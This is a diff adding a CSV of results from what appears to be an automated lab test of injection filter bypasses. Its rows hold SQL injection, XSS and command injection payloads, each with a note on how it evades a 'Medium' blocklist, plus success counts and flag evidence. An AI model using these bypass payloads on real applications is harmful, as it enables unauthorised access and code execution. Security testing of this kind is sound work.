@@ -1,0 +1,13 @@
+class,owasp,payload,bypass_note,confirmed,successes,trials,reliability,deterministic,evidence,medium_filter_blocked,medium_filter_rule
+sqli,A03:2021-Injection,admin' OR '1'='1,raw string tautology (blocklist catches it),False,0,3,0.0,True,,True,SQLi quote-OR opener
+sqli,A03:2021-Injection,admin'/**/OR/**/'1'='1,inline-comment spacing defeats whitespace-anchored rules,True,3,3,1.0,True,marker 'FLAG-sqli-9f2c-admin-session' present,False,
+sqli,A03:2021-Injection,admin'/**/OR/**/'1'LIKE'1,LIKE instead of = evades the tautology rules,True,3,3,1.0,True,marker 'FLAG-sqli-9f2c-admin-session' present,False,
+sqli,A03:2021-Injection,admin'/**/OR/**/'1'>'0,comparison operator > evades the = rules,True,3,3,1.0,True,marker 'FLAG-sqli-9f2c-admin-session' present,False,
+xss,A03:2021-Injection,<script>alert(1)</script>,raw <script> (Medium filter strips it),False,0,3,0.0,True,,False,
+xss,A03:2021-Injection,<ScRiPt>alert(1)</ScRiPt>,case bypass: filter strips only lowercase <script>,True,3,3,1.0,True,unescaped active markup reflected to the browser,False,
+xss,A03:2021-Injection,<img src=x onerror=alert(1)>,no <script> tag at all (onerror handler),True,3,3,1.0,True,unescaped active markup reflected to the browser,False,
+xss,A03:2021-Injection,<scr<script>ipt>alert(1)</script>,nested tag: one str_replace leaves a real <script>,True,3,3,1.0,True,unescaped active markup reflected to the browser,False,
+cmdi,A03:2021-Injection,127.0.0.1; whoami,raw `;` separator (Medium filter strips it),False,0,3,0.0,True,,False,
+cmdi,A03:2021-Injection,127.0.0.1 | whoami,"pipe separator, not on the blacklist",True,3,3,1.0,True,shell metacharacter reached the command,False,
+cmdi,A03:2021-Injection,127.0.0.1 `whoami`,backtick command substitution,True,3,3,1.0,True,shell metacharacter reached the command,False,
+cmdi,A03:2021-Injection,127.0.0.1 $(whoami),$() command substitution,True,3,3,1.0,True,shell metacharacter reached the command,False,
